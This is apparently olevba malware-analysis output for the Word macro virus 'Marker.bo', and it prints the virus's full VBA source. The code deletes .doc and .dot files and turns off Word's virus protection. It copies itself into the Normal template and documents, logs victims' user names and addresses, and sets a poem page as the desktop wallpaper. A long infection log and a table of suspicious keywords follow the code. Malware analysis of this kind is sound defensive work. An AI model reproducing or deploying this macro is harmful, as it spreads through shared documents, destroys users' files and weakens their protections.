olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.bo-9b467f29411af6433354d217e7c6055bcb15efc2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.bo-9b467f29411af6433354d217e7c6055bcb15efc2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest-versi212x"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString Jon
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString Jon
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html>Partic<title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylifeadr"
 Print #1, "adrLong ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "adrYou were gone since yester month But the memories, never would dissapear"
 Print #1, "adrI think of you, I THINK OF YOU.adr"
 Print #1, "adrYes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "adrYes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "adrDear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "adrDear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "adrLong ago so faraway. But the light of blue, still living with me today."
 Print #1, "adrYou were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong>adrSpeed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' JonMMx 2000
' jonthebest@hotbot.com


' 09:07:259:07:25 -Sabtu, 24 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:05:474:05:47 AM AM-Thursday, 26 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:41:387:41:38 PM PM-Friday, 27 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:43:2212:43:22 PM PM-Monday, 30 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:02:559:02:55 -Sabtu, 28 Agust 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:16:1314:16:13 -Jumat, 3 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:17:374:17:37 AM AM-Saturday, 4 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:42:399:42:39 PM PM-Monday, 6 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:14:289:14:28 PM PM-Monday, 6 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:08:3013:08:30 -Rabu, 22 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:05:5522:05:55 -Senin, 13 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:19:506:19:50 PM PM-Monday, 27 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:58:2110:58:21 PM PM-Tuesday, 28 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:00:182:00:18 PM PM-Tuesday, 28 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:14:154:14:15 PM PM-Friday, 1 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:43:128:43:12 AM AM-Saturday, 2 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:37:3915:37:39 -Kamis, 21 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:53:5617:53:56 -Kamis, 21 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:17:5611:17:56 -Jumat, 22 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:35:2520:35:25  PM-Sabtu, 23 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:19:1715:19:17  PM-Sabtu, 30 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:26:4219:26:42  PM-Minggu, 31 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:33:3914:33:39 -Senin, 1 Nop 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:59:3715:59:37 -Rabu, 3 Nop 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:17:311:17:31 PM PM-Tuesday, 4 May 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:23:511:23:51 PM PM-Monday, 8 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:12:189:12:18 AM AM-Monday, 15 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:18:2011:18:20 PM PM-Wednesday, 1 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:32:4810:32:48 PM PM-Tuesday, 30 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:19:5709:19:57 pm pm-Friday, 17 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:04:11:04:01 PM PM-Thursday, 3 Jan 1980
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:32:294:32:29 AM AM-Tuesday, 25 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:27:1511:27:15 PM PM-Sunday, 30 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:58:534:58:53 PM PM-Thursday, 2 Mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:56:233:56:23 PM PM-Friday, 3 Mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:51:489:51:48 PM PM-Sunday, 18 Jun 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:06:561:06:56 PM PM-Monday, 19 Jun 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:49:268:49:26 PM PM-Thursday, 29 Jun 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:03:320:03:03  PM-Thursday, 13 Jul 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:59:303:59:30 PM PM-Thursday, 3 Aug 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:35:563:35:56 PM PM-Tuesday, 3 Oct 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:54:34:54:03 PM PM-Thursday, 12 Oct 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:31:2212:31:22 PM PM-Monday, 27 Nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:11:3011:11:30 AM AM-Thursday, 14 Dec 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:18:5410:18:54 AM AM-Monday, 8 Jan 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:26:524:26:52 PM PM-Thursday, 22 Feb 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:28:83:28:08 PM PM-Monday, 26 Feb 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:48:61:48:06 PM PM-Monday, 16 Apr 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:28:334:28:33 PM PM-Wednesday, 9 May 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:49:808:49:08 -tirsdag, 26 jun 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:29:561:29:56 PM PM-Monday, 2 Jul 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:08:014:08:00  odp.-pátek, 6 VII 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

